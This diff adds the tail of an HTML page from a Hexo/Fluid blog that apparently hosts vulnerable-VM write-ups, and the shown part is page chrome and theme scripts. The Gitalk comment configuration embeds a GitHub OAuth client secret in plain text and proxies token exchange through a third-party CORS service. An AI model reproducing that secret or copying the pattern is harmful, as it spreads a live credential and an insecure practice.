+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/837eac51f5d4.html" title="Freshly 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Freshly 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/6a3fef14f8e4.html" title="hackme 靶机">
+                        <span class="hidden-mobile">hackme 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '50de19e41d99c4cc713a43a63ece5fff'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
